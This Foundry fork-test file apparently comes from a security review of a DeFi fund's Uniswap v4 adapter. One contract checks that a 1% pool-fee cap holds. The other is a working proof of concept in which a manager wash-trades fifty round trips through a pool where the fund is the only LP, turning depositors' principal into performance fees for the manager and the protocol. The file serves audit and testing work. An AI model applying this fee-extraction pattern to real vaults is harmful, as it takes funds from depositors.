// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {IStateView} from "@uniswap/v4-periphery/src/interfaces/IStateView.sol";
import {IAllowanceTransfer} from "permit2/src/interfaces/IAllowanceTransfer.sol";

import {UniswapV4Adapter} from "../../../src/adapters/UniswapV4Adapter.sol";
import {IAdapter} from "../../../src/interfaces/IAdapter.sol";
import {ManagerFeeVault} from "../../../src/core/ManagerFeeVault.sol";
import {AdaptersForkBase, IPermit2Of} from "./AdaptersForkBase.sol";

/// @notice (adapters review) One-shot variant of the wash-trade channel: the Mandate lists a hookless WETH/USDC pool
///         with a 100% static LP fee. The fund is its only LP. One manager swap with `minAmountOut = 0` paid the whole
///         input to the fund's own position as fees, which the adapter reported as income (DEC-079), and the Core Vault
///         charged the performance fee on it (DEC-107). e5c778a: 100,000 USDC in one call, the manager withdrew
///         12,500 and the protocol took 12,500.
/// @notice Ported to fix/pp-sc-fix-independent-review (review M-02): the adapter refuses a hookless pool above a 1% LP
///         fee (`PoolFeeTooHigh`, `MAX_POOL_FEE` = 10,000), so the one-shot pool cannot be listed.
/// @dev Run: ARBITRUM_RPC_URL=https://arb1.arbitrum.io/rpc ARBITRUM_FORK_BLOCK=<head - 300>
///      forge test -j 1 --match-path 'test/review/adapters/HighFeePoolIncomeFork.t.sol' -vv
contract HighFeePoolIncomeFork is AdaptersForkBase {
    function _secondFee() internal pure override returns (uint24) {
        return 1_000_000;
    }

    /// @dev Only the fork and the 100% pool: the fund cannot be deployed with it.
    function setUp() public override {
        _forkAndInitializeSecondPool();
    }

    function _keysWith(PoolKey memory second) internal view returns (PoolKey[] memory keys) {
        keys = new PoolKey[](2);
        keys[0] = liveKey;
        keys[1] = second;
    }

    /// @dev The `permit2` address is read before the caller arms `expectRevert`, so the revert expected is the
    ///      constructor's.
    function _newAdapter(PoolKey[] memory keys, address permit2) internal returns (UniswapV4Adapter) {
        return new UniswapV4Adapter(
            makeAddr("vault"),
            makeAddr("guardian"),
            IPoolManager(PM),
            IPositionManager(POSM),
            IStateView(SV),
            IAllowanceTransfer(permit2),
            keys
        );
    }

    function test_REVIEW_M02_fullFeeMandatePoolIsRefusedByTheAdapter() public {
        address permit2 = IPermit2Of(POSM).permit2();
        PoolKey[] memory keys = _keysWith(secondKey);
        vm.expectRevert(abi.encodeWithSelector(UniswapV4Adapter.PoolFeeTooHigh.selector, secondPool, uint24(1_000_000)));
        _newAdapter(keys, permit2);

        // The bound is exact: one pip above 1% is refused, 1% itself is accepted (re-attack at the boundary).
        PoolKey memory above = PoolKey(Currency.wrap(WETH), Currency.wrap(USDC), 10_001, 60, IHooks(address(0)));
        keys = _keysWith(above);
        vm.expectRevert(
            abi.encodeWithSelector(
                UniswapV4Adapter.PoolFeeTooHigh.selector, PoolId.unwrap(above.toId()), uint24(10_001)
            )
        );
        _newAdapter(keys, permit2);
        PoolKey memory atCap = PoolKey(Currency.wrap(WETH), Currency.wrap(USDC), 10_000, 60, IHooks(address(0)));
        _newAdapter(_keysWith(atCap), permit2);
    }
}

/// @notice What M-02 still allows at the cap: the same channel through a 1% Mandate pool in which the fund is the only
///         LP. Each round trip of the manager's own Unallocated Balance through the fund's own range turns 2% of the leg
///         into "income" with no loss to anyone but the holders, and nothing bounds the number of round trips: the
///         one-shot 100% pool's effect is reached in about fifty calls. Performance fee 25% (the Mandate cap), protocol
///         slice 50%, as in the original one-shot test.
contract OnePercentPoolWashFork is AdaptersForkBase {
    uint256 internal constant ROUND_TRIPS = 50;
    uint256 internal constant LEG = 20_000e6;

    function _secondFee() internal pure override returns (uint24) {
        return 10_000;
    }

    function test_POC_REVIEW_M02_onePercentPoolWashTurnsPrincipalIntoFeeableIncome() public {
        // 1. Alice deposits 1,000,000 USDC; the manager allocates 400,000 to the hub Spoke Vault.
        _depositAs(alice, 1_000_000e6);
        vm.prank(manager);
        vault.allocateToHubSpokeVault(400_000e6);

        // 2. The manager buys WETH in the live pool and opens a +-10% position of about 100,000 in the 1% pool, where
        //    the fund is the only LP.
        vm.prank(manager);
        uint256 weth = hubVault.swapExactInput(address(adapter), livePool, USDC, 50_000e6, 0, "");
        int24 lo = _floor(tick0, 60) - 960;
        bytes memory params = abi.encode(
            UniswapV4Adapter.OpenParams({
                tickLower: lo,
                tickUpper: lo + 1920,
                liquidity: 0,
                amount0Max: uint128(weth),
                amount1Max: uint128(50_000e6),
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );
        vm.prank(manager);
        (bytes32 pk, uint256 used0, uint256 used1) =
            hubVault.openPosition(address(adapter), secondPool, weth, 50_000e6, params);

        address mfv = vault.managerFeeVault();
        uint256 shareAssetsBefore = vault.shareAssets();
        uint256 holderIncomeBefore = _usd(vault.collectedIncome(WETH), vault.collectedIncome(USDC));
        uint256 protocolBefore =
            _usd(IERC20(WETH).balanceOf(protocolRecipient), IERC20(USDC).balanceOf(protocolRecipient));

        // 3. Round trips of 20,000 USDC through the 1% pool with minAmountOut 0: the fund trades against itself.
        for (uint256 i; i < ROUND_TRIPS; ++i) {
            vm.prank(manager);
            uint256 wethOut = hubVault.swapExactInput(address(adapter), secondPool, USDC, LEG, 0, "");
            vm.prank(manager);
            hubVault.swapExactInput(address(adapter), secondPool, WETH, wethOut, 0, "");
        }

        // 4. Collect and forward (anyone): the Core Vault splits it as income.
        vm.prank(manager);
        IAdapter.Amounts memory inc = hubVault.collectIncome(address(adapter), pk);
        if (hubVault.collectedIncome(WETH) != 0) hubVault.forwardIncomeToCoreVault(WETH);
        if (hubVault.collectedIncome(USDC) != 0) hubVault.forwardIncomeToCoreVault(USDC);

        uint256 incomeUsd = _usd(inc.income0, inc.income1);
        uint256 managerCut = _usd(IERC20(WETH).balanceOf(mfv), IERC20(USDC).balanceOf(mfv));
        uint256 protocolCut =
            _usd(IERC20(WETH).balanceOf(protocolRecipient), IERC20(USDC).balanceOf(protocolRecipient)) - protocolBefore;
        uint256 holdersBefore = shareAssetsBefore + holderIncomeBefore;
        uint256 holdersAfter = vault.shareAssets() + _usd(vault.collectedIncome(WETH), vault.collectedIncome(USDC));
        console2.log("position used WETH / USDC", used0, used1);
        console2.log("wash volume (USDC)", 2 * LEG * ROUND_TRIPS);
        console2.log("income reported by the adapter, WETH / USDC", inc.income0, inc.income1);
        console2.log("income (USDC at the oracle)", incomeUsd);
        console2.log("Share Assets before / after", shareAssetsBefore, vault.shareAssets());
        console2.log("holders' value lost (Share Assets + Attributed Income)", holdersBefore - holdersAfter);
        console2.log("manager fee vault", managerCut);
        console2.log("protocol slice", protocolCut);

        // The cap bounds one swap, not the channel: about 2% of the leg per round trip becomes income, a quarter of it
        // leaves the holders (12.5% to the manager, 12.5% to the protocol).
        assertGt(incomeUsd, 2 * LEG * ROUND_TRIPS * 95 / 10_000, "over 0.95% of the volume came back as income");
        assertApproxEqRel(managerCut, incomeUsd / 8, 0.01e18, "the manager took 12.5% of it");
        assertApproxEqRel(protocolCut, incomeUsd / 8, 0.01e18, "the protocol took 12.5% of it");
        assertApproxEqRel(holdersBefore - holdersAfter, managerCut + protocolCut, 0.05e18, "the holders paid both");
    }
}
